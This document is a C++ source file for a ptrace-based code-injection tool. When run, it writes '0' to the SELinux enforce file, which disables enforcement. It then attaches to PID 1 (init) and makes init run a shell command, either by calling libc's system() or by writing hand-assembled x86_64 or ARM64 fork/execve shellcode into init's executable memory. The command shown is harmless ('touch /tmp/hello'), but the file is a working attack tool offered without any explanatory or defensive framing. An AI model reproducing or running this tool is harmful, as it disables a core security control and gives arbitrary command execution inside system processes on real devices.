#include <cctype>
#include <cerrno>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>
#include <iostream>
#include <sys/stat.h>

#include <dirent.h>
#include <elf.h>
#include <inttypes.h>
#include <signal.h>
#include <sys/ptrace.h>
#include <sys/uio.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

#include <array>
#include <fcntl.h>

#if defined(__aarch64__)
using Regs = user_regs_struct;
#elif defined(__x86_64__)
using Regs = user_regs_struct;
#elif defined(__arm__)
using Regs = user_regs;
#else
#error "unsupported architecture"
#endif

struct MemRegion {
    uint64_t start;
    uint64_t end;
    uint64_t offset;
    std::string path;
    bool r;
    bool w;
    bool x;
};

static std::vector<MemRegion> parse_maps(pid_t pid) {
    std::vector<MemRegion> out;
    char pbuf[64];
    snprintf(pbuf, sizeof(pbuf), "/proc/%d/maps", pid);
    FILE* f = fopen(pbuf, "r");
    if (!f) return out;
    char line[1024];
    while (fgets(line, sizeof(line), f)) {
        uint64_t start = 0, end = 0, off = 0;
        char perms[8] = {0};
        if (sscanf(line, "%" SCNx64 "-%" SCNx64 " %7s %" SCNx64 " %*s %*s",
                   &start, &end, perms, &off) != 4)
            continue;
        MemRegion m{start, end, off, "", false, false, false};
        char* p = strchr(line, '/');
        if (p) {
            m.path = p;
            while (!m.path.empty() && (m.path.back() == '\n' || m.path.back() == '\r'))
                m.path.pop_back();
        }
        m.r = strchr(perms, 'r') != nullptr;
        m.w = strchr(perms, 'w') != nullptr;
        m.x = strchr(perms, 'x') != nullptr;
        out.push_back(m);
    }
    fclose(f);
    return out;
}

static bool target_libc(pid_t pid, uint64_t* base, std::string* path) {
    for (auto& m : parse_maps(pid)) {
        size_t slash = m.path.find_last_of('/');
        std::string name = (slash == std::string::npos) ? m.path : m.path.substr(slash + 1);
        if (name.compare(0, 7, "libc.so") == 0) {
            *base = m.start - m.offset;
            *path = m.path;
            return true;
        }
    }
    return false;
}

static bool read_file(const std::string& path, std::vector<uint8_t>& out) {
    FILE* f = fopen(path.c_str(), "rb");
    if (!f) return false;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    if (sz <= 0) {
        fclose(f);
        return false;
    }
    fseek(f, 0, SEEK_SET);
    out.resize((size_t)sz);
    bool ok = fread(out.data(), 1, (size_t)sz, f) == (size_t)sz;
    fclose(f);
    return ok;
}

static bool cstr_eq(const std::vector<uint8_t>& d, uint64_t off, const char* want) {
    if (off >= d.size()) return false;
    size_t i = 0;
    while (want[i]) {
        if (off + i >= d.size() || d[off + i] != (uint8_t)want[i]) return false;
        i++;
    }
    return d[off + i] == 0;
}

static uint64_t elf_symbol_offset(const std::string& path, const char* want) {
    std::vector<uint8_t> d;
    if (!read_file(path, d)) return 0;
    if (d.size() < 16 || memcmp(d.data(), ELFMAG, SELFMAG) != 0) return 0;
    unsigned char cls = d[EI_CLASS];
    if (d[EI_DATA] != ELFDATA2LSB) return 0;
    bool is64 = (cls == ELFCLASS64);
    if (!is64 && cls != ELFCLASS32) return 0;

    uint64_t bias = UINT64_MAX;
    uint64_t dyn_off = 0, dyn_sz = 0;
    uint64_t dynsym_sz = 0;

    if (is64) {
        if (d.size() < sizeof(Elf64_Ehdr)) return 0;
        Elf64_Ehdr* eh = (Elf64_Ehdr*)d.data();
        if (eh->e_type != ET_DYN || eh->e_phentsize != sizeof(Elf64_Phdr)) return 0;
        uint64_t shoff = eh->e_shoff, shentsize = eh->e_shentsize, shnum = eh->e_shnum;
        if (shoff && shentsize == sizeof(Elf64_Shdr) && shoff + shnum * shentsize <= d.size()) {
            for (uint64_t i = 0; i < shnum; i++) {
                Elf64_Shdr* sh = (Elf64_Shdr*)(d.data() + shoff + i * shentsize);
                if (sh->sh_type == SHT_DYNSYM) {
                    dynsym_sz = sh->sh_size;
                    break;
                }
            }
        }
        for (uint64_t i = 0; i < eh->e_phnum &&
                            eh->e_phoff + (i + 1) * (uint64_t)eh->e_phentsize <= d.size(); i++) {
            Elf64_Phdr* ph = (Elf64_Phdr*)(d.data() + eh->e_phoff + i * eh->e_phentsize);
            uint64_t b = ph->p_vaddr - ph->p_offset;
            if (b < bias) bias = b;
            if (ph->p_type == PT_DYNAMIC) {
                dyn_off = ph->p_offset;
                dyn_sz = ph->p_filesz;
            }
        }
    } else {
        if (d.size() < sizeof(Elf32_Ehdr)) return 0;
        Elf32_Ehdr* eh = (Elf32_Ehdr*)d.data();
        if (eh->e_type != ET_DYN || eh->e_phentsize != sizeof(Elf32_Phdr)) return 0;
        uint64_t shoff = eh->e_shoff, shentsize = eh->e_shentsize, shnum = eh->e_shnum;
        if (shoff && shentsize == sizeof(Elf32_Shdr) && shoff + shnum * shentsize <= d.size()) {
            for (uint64_t i = 0; i < shnum; i++) {
                Elf32_Shdr* sh = (Elf32_Shdr*)(d.data() + shoff + i * shentsize);
                if (sh->sh_type == SHT_DYNSYM) {
                    dynsym_sz = sh->sh_size;
                    break;
                }
            }
        }
        for (uint64_t i = 0; i < eh->e_phnum &&
                            eh->e_phoff + (i + 1) * (uint64_t)eh->e_phentsize <= d.size(); i++) {
            Elf32_Phdr* ph = (Elf32_Phdr*)(d.data() + eh->e_phoff + i * eh->e_phentsize);
            uint64_t b = ph->p_vaddr - ph->p_offset;
            if (b < bias) bias = b;
            if (ph->p_type == PT_DYNAMIC) {
                dyn_off = ph->p_offset;
                dyn_sz = ph->p_filesz;
            }
        }
    }
    if (bias == UINT64_MAX || dyn_off == 0 || dyn_sz == 0 || dyn_off + dyn_sz > d.size())
        return 0;

    uint64_t symtab = 0, strtab = 0, strsz = 0, syment = 0;
    if (is64) {
        for (uint64_t off = dyn_off; off + sizeof(Elf64_Dyn) <= dyn_off + dyn_sz;
             off += sizeof(Elf64_Dyn)) {
            Elf64_Dyn* dn = (Elf64_Dyn*)(d.data() + off);
            if (dn->d_tag == DT_SYMTAB)
                symtab = dn->d_un.d_ptr;
            else if (dn->d_tag == DT_STRTAB)
                strtab = dn->d_un.d_ptr;
            else if (dn->d_tag == DT_STRSZ)
                strsz = dn->d_un.d_val;
            else if (dn->d_tag == DT_SYMENT)
                syment = dn->d_un.d_val;
            else if (dn->d_tag == DT_NULL)
                break;
        }
        if (!symtab || !strtab || syment != sizeof(Elf64_Sym)) return 0;
        uint64_t nsyms = dynsym_sz / sizeof(Elf64_Sym);
        if (nsyms == 0) return 0;
        uint64_t sym_off = symtab - bias, str_off = strtab - bias;
        if (sym_off + nsyms * sizeof(Elf64_Sym) > d.size()) return 0;
        for (uint64_t i = 0; i < nsyms; i++) {
            Elf64_Sym* s = (Elf64_Sym*)(d.data() + sym_off + i * sizeof(Elf64_Sym));
            if (s->st_name == 0 || s->st_shndx == SHN_UNDEF || s->st_name >= strsz) continue;
            if (cstr_eq(d, str_off + s->st_name, want)) return s->st_value - bias;
        }
    } else {
        for (uint64_t off = dyn_off; off + sizeof(Elf32_Dyn) <= dyn_off + dyn_sz;
             off += sizeof(Elf32_Dyn)) {
            Elf32_Dyn* dn = (Elf32_Dyn*)(d.data() + off);
            if (dn->d_tag == DT_SYMTAB)
                symtab = dn->d_un.d_ptr;
            else if (dn->d_tag == DT_STRTAB)
                strtab = dn->d_un.d_ptr;
            else if (dn->d_tag == DT_STRSZ)
                strsz = dn->d_un.d_val;
            else if (dn->d_tag == DT_SYMENT)
                syment = dn->d_un.d_val;
            else if (dn->d_tag == DT_NULL)
                break;
        }
        if (!symtab || !strtab || syment != sizeof(Elf32_Sym)) return 0;
        uint64_t nsyms = dynsym_sz / sizeof(Elf32_Sym);
        if (nsyms == 0) return 0;
        uint64_t sym_off = symtab - bias, str_off = strtab - bias;
        if (sym_off + nsyms * sizeof(Elf32_Sym) > d.size()) return 0;
        for (uint64_t i = 0; i < nsyms; i++) {
            Elf32_Sym* s = (Elf32_Sym*)(d.data() + sym_off + i * sizeof(Elf32_Sym));
            if (s->st_name == 0 || s->st_shndx == SHN_UNDEF || s->st_name >= strsz) continue;
            if (cstr_eq(d, str_off + s->st_name, want)) return s->st_value - bias;
        }
    }
    return 0;
}

static uint64_t find_scratch(pid_t pid, uint64_t sp, size_t need) {
    auto maps = parse_maps(pid);
    if (sp > 0x4000) {
        uint64_t addr = (sp - 0x2000) & ~0x1FULL;
        for (auto& m : maps)
            if (m.r && m.w && addr >= m.start && addr + need <= m.end)
                return addr;
    }
    for (auto& m : maps)
        if (m.r && m.w && !m.x && m.path.empty() && m.end - m.start >= need + 0x1000)
            return (m.start + 0x1000) & ~0x1FULL;
    return 0;
}

static bool peek_word(pid_t pid, uint64_t addr, long* out) {
    errno = 0;
    *out = ptrace(PTRACE_PEEKDATA, pid, (void*)addr, nullptr);
    return errno == 0;
}

static bool poke_word(pid_t pid, uint64_t addr, long val) {
    return ptrace(PTRACE_POKEDATA, pid, (void*)addr, (void*)val) != -1;
}

static bool write_bytes(pid_t pid, uint64_t addr, const void* buf, size_t len) {
    const uint8_t* b = static_cast<const uint8_t*>(buf);
    size_t off = addr % sizeof(long);
    if (off) {
        long word = 0;
        if (!peek_word(pid, addr - off, &word)) return false;
        size_t n = std::min(len, sizeof(long) - off);
        memcpy(reinterpret_cast<uint8_t*>(&word) + off, b, n);
        if (!poke_word(pid, addr - off, word)) return false;
        addr += n;
        b += n;
        len -= n;
    }
    while (len >= sizeof(long)) {
        long word = 0;
        memcpy(&word, b, sizeof(word));
        if (!poke_word(pid, addr, word)) return false;
        addr += sizeof(long);
        b += sizeof(long);
        len -= sizeof(long);
    }
    if (len) {
        long word = 0;
        if (!peek_word(pid, addr, &word)) return false;
        memcpy(&word, b, len);
        if (!poke_word(pid, addr, word)) return false;
    }
    return true;
}

static bool get_regs(pid_t pid, Regs& r) {
    struct iovec iov = {&r, sizeof(r)};
    return ptrace(PTRACE_GETREGSET, pid, (void*)NT_PRSTATUS, &iov) != -1;
}

static bool set_regs(pid_t pid, const Regs& r) {
    struct iovec iov = {const_cast<Regs*>(&r), sizeof(r)};
    return ptrace(PTRACE_SETREGSET, pid, (void*)NT_PRSTATUS, &iov) != -1;
}

#if defined(__aarch64__)
static uint64_t reg_pc(const Regs& r) { return r.pc; }
static uint64_t reg_sp(const Regs& r) { return r.sp; }
static uint64_t reg_ret(const Regs& r) { return r.regs[0]; }
static bool apply_call(pid_t, Regs& r, uint64_t fn, uint64_t arg, uint64_t stub) {
    r.regs[0] = arg;
    r.regs[30] = stub;
    r.pc = fn;
    r.sp = (r.sp - 128) & ~0xFULL;
    return true;
}
static const uint8_t* trap_bytes() {
    static const uint8_t b[4] = {0x00, 0x00, 0x20, 0xd4};  // brk #0
    return b;
}
static size_t trap_len() { return 4; }
#elif defined(__x86_64__)
static uint64_t reg_pc(const Regs& r) { return r.rip; }
static uint64_t reg_sp(const Regs& r) { return r.rsp; }
static uint64_t reg_ret(const Regs& r) { return r.rax; }
static bool apply_call(pid_t pid, Regs& r, uint64_t fn, uint64_t arg, uint64_t stub) {
    uint64_t sp = (r.rsp - 128) & ~0xFULL;
    sp -= 8;
    if (!poke_word(pid, sp, (long)stub)) return false;
    r.rdi = arg;
    r.rip = fn;
    r.rsp = sp;
    return true;
}
static const uint8_t* trap_bytes() {
    static const uint8_t b[1] = {0xcc};  // int3
    return b;
}
static size_t trap_len() { return 1; }
#elif defined(__arm__)
static uint64_t reg_pc(const Regs& r) { return r.uregs[15]; }
static uint64_t reg_sp(const Regs& r) { return r.uregs[13]; }
static uint64_t reg_ret(const Regs& r) { return r.uregs[0]; }
static bool apply_call(pid_t, Regs& r, uint64_t fn, uint64_t arg, uint64_t stub) {
    r.uregs[0] = arg;
    r.uregs[14] = stub;
    r.uregs[15] = fn;
    r.uregs[13] = (r.uregs[13] - 128) & ~7ULL;
    return true;
}
static const uint8_t* trap_bytes() {
    static const uint8_t b[4] = {0x70, 0x00, 0x20, 0xe1};  // ARM bkpt #0
    return b;
}
static size_t trap_len() { return 4; }
#endif

#if defined(__x86_64__) || defined(__aarch64__)
static bool read_bytes(pid_t pid, uint64_t addr, void* buf, size_t len) {
#if !defined(__ANDROID__) || __ANDROID_API__ >= 23
    struct iovec local = {buf, len};
    struct iovec remote = {(void*)addr, len};
    if (process_vm_readv(pid, &local, 1, &remote, 1, 0) == (ssize_t)len) return true;
#endif
    uint8_t* b = static_cast<uint8_t*>(buf);
    size_t done = 0;
    while (done < len) {
        long w = 0;
        if (!peek_word(pid, addr + done, &w)) return false;
        size_t n = std::min(len - done, sizeof(long));
        memcpy(b + done, &w, n);
        done += n;
    }
    return true;
}

static std::string find_shell(pid_t pid) {
    const char* cands[] = {"/bin/sh", "/system/bin/sh", "/usr/bin/sh"};
    for (const char* c : cands) {
        std::string p = "/proc/" + std::to_string(pid) + "/root" + c;
        if (access(p.c_str(), X_OK) == 0) return c;
    }
    return "/bin/sh";
}
#endif

#if defined(__x86_64__)
// fork(); child: execve(sh, [sh,"-c",cmd], NULL); parent: wait4(); return status.
// Data (strings/argv/status) lives at addresses passed in; int3 at the end
// returns control to the tracer.
static std::vector<uint8_t> build_exec_payload(uint64_t status_addr, uint64_t sh_addr,
                                              uint64_t argv_addr) {
    std::vector<uint8_t> p;
    auto u8 = [&](uint8_t v) { p.push_back(v); };
    auto u32 = [&](uint32_t v) {
        for (int i = 0; i < 4; i++) p.push_back((uint8_t)(v >> (8 * i)));
    };
    auto u64 = [&](uint64_t v) {
        for (int i = 0; i < 8; i++) p.push_back((uint8_t)(v >> (8 * i)));
    };
    auto mov_rax = [&](uint32_t v) { u8(0x48); u8(0xC7); u8(0xC0); u32(v); };
    auto mov_rdi = [&](uint64_t v) { u8(0x48); u8(0xBF); u64(v); };
    auto mov_rsi = [&](uint64_t v) { u8(0x48); u8(0xBE); u64(v); };

    mov_rax(57);                          // fork
    u8(0x0F); u8(0x05);                   // syscall
    u8(0x48); u8(0x85); u8(0xC0);         // test rax, rax
    u8(0x0F); u8(0x88); u32(0x55);        // js fail
    u8(0x74); u8(0x26);                   // jz child
    u8(0x48); u8(0x89); u8(0xC7);         // mov rdi, rax
    mov_rsi(status_addr);                 // wait4 status buffer
    u8(0x31); u8(0xD2);                   // xor edx, edx
    u8(0x45); u8(0x31); u8(0xD2);         // xor r10d, r10d
    mov_rax(61);                          // wait4
    u8(0x0F); u8(0x05);                   // syscall
    u8(0x48); u8(0xA1); u64(status_addr); // mov rax, [status]
    u8(0xCC);                             // int3
    mov_rdi(sh_addr);                     // child: execve
    mov_rsi(argv_addr);
    u8(0x31); u8(0xD2);                   // xor edx, edx (envp = NULL)
    mov_rax(59);
    u8(0x0F); u8(0x05);
    mov_rax(60);                          // execve failed: exit(127)
    u8(0xBF); u32(127);
    u8(0x0F); u8(0x05);
    mov_rax(0xFFFFFFFFu);                 // fail: rax = -1
    u8(0xCC);                             // int3
    return p;
}
#elif defined(__aarch64__)
static uint32_t arm64_movz(uint32_t rd, uint32_t imm16, int shift) {
    return 0xD2800000u | ((uint32_t)(shift / 16) << 21) | ((imm16 & 0xFFFF) << 5) | (rd & 0x1F);
}
static uint32_t arm64_movk(uint32_t rd, uint32_t imm16, int shift) {
    return 0xF2800000u | ((uint32_t)(shift / 16) << 21) | ((imm16 & 0xFFFF) << 5) | (rd & 0x1F);
}

// clone(SIGCHLD); child: execve(sh, [sh,"-c",cmd], NULL); parent: wait4(); x0 = status.
// Same data layout as the x86_64 payload; brk #0 at the end returns control.
static std::vector<uint8_t> build_exec_payload(uint64_t status_addr, uint64_t sh_addr,
                                              uint64_t argv_addr) {
    std::vector<uint32_t> c;
    auto movz = [&](uint32_t rd, uint32_t imm, int shift) {
        c.push_back(arm64_movz(rd, imm, shift));
    };
    auto movk = [&](uint32_t rd, uint32_t imm, int shift) {
        c.push_back(arm64_movk(rd, imm, shift));
    };
    auto load64 = [&](uint32_t rd, uint64_t v) {
        movz(rd, (uint32_t)(v & 0xFFFF), 0);
        movk(rd, (uint32_t)((v >> 16) & 0xFFFF), 16);
        movk(rd, (uint32_t)((v >> 32) & 0xFFFF), 32);
        movk(rd, (uint32_t)((v >> 48) & 0xFFFF), 48);
    };

    movz(0, 17, 0);           // mov x0, #SIGCHLD
    movz(1, 0, 0);
    movz(2, 0, 0);
    movz(3, 0, 0);
    movz(4, 0, 0);
    movz(8, 220, 0);          // __NR_clone
    c.push_back(0xD4000001);  // svc #0
    size_t cbz_idx = c.size();
    c.push_back(0);           // cbz x0, child
    c.push_back(0xF100001F);  // cmp x0, #0
    size_t blt_idx = c.size();
    c.push_back(0);           // b.lt fail
    load64(1, status_addr);   // wait4 status buffer
    movz(2, 0, 0);
    movz(3, 0, 0);
    movz(8, 260, 0);          // __NR_wait4
    c.push_back(0xD4000001);  // svc #0
    c.push_back(0xF9400020);  // ldr x0, [x1]
    size_t b_idx = c.size();
    c.push_back(0);           // b trap
    size_t child_idx = c.size();
    load64(0, sh_addr);       // execve
    load64(1, argv_addr);
    movz(2, 0, 0);            // envp = NULL
    movz(8, 221, 0);          // __NR_execve
    c.push_back(0xD4000001);  // svc #0
    movz(0, 127, 0);          // execve failed: exit(127)
    movz(8, 93, 0);           // __NR_exit
    c.push_back(0xD4000001);  // svc #0
    size_t fail_idx = c.size();
    c.push_back(0x92800000);  // movn x0, #0
    size_t trap_idx = c.size();
    c.push_back(0xD4200000);  // brk #0

    c[cbz_idx] = 0xB4000000u | ((uint32_t)((child_idx - cbz_idx) & 0x7FFFF) << 5);
    c[blt_idx] = 0x54000000u | ((uint32_t)((fail_idx - blt_idx) & 0x7FFFF) << 5) | 0xB;
    c[b_idx] = 0x14000000u | ((uint32_t)(trap_idx - b_idx) & 0x03FFFFFF);

    std::vector<uint8_t> out;
    out.reserve(c.size() * 4);
    for (uint32_t w : c) {
        out.push_back((uint8_t)w);
        out.push_back((uint8_t)(w >> 8));
        out.push_back((uint8_t)(w >> 16));
        out.push_back((uint8_t)(w >> 24));
    }
    return out;
}
#endif

enum WaitResult { CALL_DONE, CALL_FAILED, CALL_TIMEOUT };

static WaitResult wait_for_call(pid_t pid, uint64_t stub_addr, int timeout_ms) {
    int elapsed = 0;
    int bad_faults = 0;
    while (elapsed < timeout_ms) {
        int status = 0;
        pid_t r = waitpid(pid, &status, WNOHANG);
        if (r == pid) {
            if (WIFEXITED(status) || WIFSIGNALED(status)) return CALL_FAILED;
            if (WIFSTOPPED(status)) {
                int sig = WSTOPSIG(status);
                Regs regs;
                get_regs(pid, regs);
                if (sig == SIGTRAP) return CALL_DONE;
                if ((sig == SIGSEGV || sig == SIGILL) && reg_pc(regs) == stub_addr)
                    return CALL_DONE;
                if (sig == SIGSTOP) {
                    ptrace(PTRACE_CONT, pid, nullptr, nullptr);
                    continue;
                }
                if (sig == SIGSEGV || sig == SIGILL) {
                    if (++bad_faults > 5) return CALL_FAILED;
                }
                ptrace(PTRACE_CONT, pid, nullptr, nullptr);
                continue;
            }
        }
        usleep(10 * 1000);
        elapsed += 10;
    }
    return CALL_TIMEOUT;
}

int main() {

    const char* path = "/sys/fs/selinux/enforce";
    struct stat st;
    if (stat(path, &st) == 0 && S_ISREG(st.st_mode)) {
        int fd = open(path, O_WRONLY);
        if (fd < 0 || write(fd, "0", 1) != 1) {
            fprintf(stderr, "failed to disable selinux\n");
            if (fd >= 0) close(fd);
            return 1;
        }
        close(fd);
    }

    pid_t pid = 1;

    printf("[+] attaching to pid %d\n", pid);
    if (ptrace(PTRACE_ATTACH, pid, nullptr, nullptr) == -1) {
        fprintf(stderr, "PTRACE_ATTACH failed: %s (run as root)\n", strerror(errno));
        return 1;
    }

    int status = 0;
    if (waitpid(pid, &status, 0) == -1 || !WIFSTOPPED(status)) {
        fprintf(stderr, "failed to wait for target stop\n");
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return 1;
    }

    Regs saved;
    if (!get_regs(pid, saved)) {
        fprintf(stderr, "PTRACE_GETREGSET failed: %s\n", strerror(errno));
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return 1;
    }

    uint64_t tgt_base = 0;
    std::string libc_path;
    uint64_t sym_off = 0;
    if (target_libc(pid, &tgt_base, &libc_path)) {
        std::string root_path = "/proc/" + std::to_string(pid) + "/root" + libc_path;
        sym_off = elf_symbol_offset(root_path, "system");
        if (!sym_off) sym_off = elf_symbol_offset(libc_path, "system");
    }

    const char* cmd = "touch /tmp/hello";

    size_t cmd_len = strlen(cmd) + 1;
    uint64_t cmd_addr = 0;
    uint64_t stub_addr = 0;
    uint64_t code_addr = 0;
    std::vector<uint8_t> saved_code;
    bool restore_code = false;
    bool raw_exec = false;

    if (sym_off) {
        uint64_t system_addr = tgt_base + sym_off;
        printf("[+] target libc: %s\n", libc_path.c_str());
        printf("[+] target libc base: 0x%" PRIx64 "\n", tgt_base);
        printf("[+] system() at: 0x%" PRIx64 " (offset 0x%" PRIx64 ")\n", system_addr, sym_off);

        uint64_t scratch = find_scratch(pid, reg_sp(saved), cmd_len + 0x40);
        if (!scratch) {
            fprintf(stderr, "no writable scratch memory found\n");
            set_regs(pid, saved);
            ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
            return 1;
        }
        cmd_addr = scratch;
        stub_addr = (scratch + cmd_len + 0x1F) & ~0xFULL;
        printf("[+] scratch: 0x%" PRIx64 " (cmd) / 0x%" PRIx64 " (trap stub)\n", cmd_addr, stub_addr);

        if (!write_bytes(pid, cmd_addr, cmd, cmd_len) ||
            !write_bytes(pid, stub_addr, trap_bytes(), trap_len())) {
            fprintf(stderr, "failed to write into target: %s\n", strerror(errno));
            set_regs(pid, saved);
            ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
            return 1;
        }
    } else {
#if defined(__x86_64__) || defined(__aarch64__)
        raw_exec = true;
        std::string shell = find_shell(pid);
        size_t sh_len = shell.size() + 1;
        size_t need = 8 + 32 + sh_len + 8 + cmd_len + 32;
        uint64_t scratch = find_scratch(pid, reg_sp(saved), need);
        if (!scratch) {
            fprintf(stderr, "no writable scratch memory found\n");
            set_regs(pid, saved);
            ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
            return 1;
        }
        uint64_t status_addr = scratch;
        uint64_t argv_addr = scratch + 8;
        uint64_t sh_addr = argv_addr + 32;
        uint64_t dashc_addr = (sh_addr + sh_len + 7) & ~7ULL;
        cmd_addr = (dashc_addr + 3 + 7) & ~7ULL;

        std::vector<uint8_t> payload = build_exec_payload(status_addr, sh_addr, argv_addr);

        auto maps = parse_maps(pid);
        uint64_t want = reg_pc(saved);
        for (auto& m : maps) {
            if (want >= m.start && want < m.end) {
                if (m.x && !m.path.empty() && m.path[0] != '[' && want + payload.size() <= m.end)
                    code_addr = want;
                break;
            }
        }
        if (!code_addr) {
            for (auto& m : maps) {
                if (m.x && !m.path.empty() && m.path[0] != '[' &&
                    m.end - m.start >= payload.size()) {
                    code_addr = m.start;
                    break;
                }
            }
        }
        if (!code_addr) {
            fprintf(stderr, "no executable memory found for payload\n");
            set_regs(pid, saved);
            ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
            return 1;
        }

        saved_code.resize(payload.size());
        if (!read_bytes(pid, code_addr, saved_code.data(), saved_code.size())) {
            fprintf(stderr, "cannot read original bytes at 0x%" PRIx64 ": %s\n", code_addr,
                    strerror(errno));
            set_regs(pid, saved);
            ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
            return 1;
        }
        restore_code = true;

        uint64_t zero = 0;
        uint64_t argv[4] = {sh_addr, dashc_addr, cmd_addr, 0};
        if (!write_bytes(pid, status_addr, &zero, sizeof(zero)) ||
            !write_bytes(pid, argv_addr, argv, sizeof(argv)) ||
            !write_bytes(pid, sh_addr, shell.c_str(), sh_len) ||
            !write_bytes(pid, dashc_addr, "-c\0", 3) ||
            !write_bytes(pid, cmd_addr, cmd, cmd_len) ||
            !write_bytes(pid, code_addr, payload.data(), payload.size())) {
            fprintf(stderr, "failed to write payload: %s\n", strerror(errno));
            set_regs(pid, saved);
            ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
            return 1;
        }
        stub_addr = code_addr + payload.size() - trap_len();
        printf("[+] no libc: built-in syscall payload (sh=%s)\n", shell.c_str());
        printf("[+] payload at 0x%" PRIx64 ", data at 0x%" PRIx64 "\n", code_addr, scratch);
#else
        if (libc_path.empty())
            fprintf(stderr, "cannot find target libc\n");
        else
            fprintf(stderr, "cannot resolve system() in %s\n", libc_path.c_str());
        set_regs(pid, saved);
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return 1;
#endif
    }

    Regs call = saved;
    if (raw_exec) {
#if defined(__x86_64__)
        call.rip = code_addr;
#elif defined(__aarch64__)
        call.pc = code_addr;
#endif
    } else {
        if (!apply_call(pid, call, tgt_base + sym_off, cmd_addr, stub_addr)) {
            fprintf(stderr, "failed to set up call frame\n");
            set_regs(pid, saved);
            ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
            return 1;
        }
    }
    if (!set_regs(pid, call)) {
        fprintf(stderr, "failed to set up call frame\n");
        set_regs(pid, saved);
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return 1;
    }

    if (raw_exec)
        printf("[+] calling exec payload(\"%s\")\n", cmd);
    else
        printf("[+] calling system(\"%s\")\n", cmd);
    ptrace(PTRACE_CONT, pid, nullptr, nullptr);

    WaitResult wr = wait_for_call(pid, stub_addr, 30000);
    int64_t result = 0;
    if (wr == CALL_DONE) {
        Regs after;
        get_regs(pid, after);
        result = (int64_t)reg_ret(after);
        printf("$1 = %" PRId64 "\n", result);
    } else if (wr == CALL_FAILED) {
        fprintf(stderr, "target died during the call\n");
        return 1;
    } else {
        fprintf(stderr, "call did not finish (timeout)\n");
        kill(pid, SIGSTOP);
        waitpid(pid, &status, 0);
    }

    if (restore_code)
        write_bytes(pid, code_addr, saved_code.data(), saved_code.size());

    set_regs(pid, saved);
    ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
    printf("[+] detached\n");

    printf("this program might have turned off selinux - you'll need to turn it back on yourself\n");

    return wr == CALL_DONE ? 0 : 2;
}
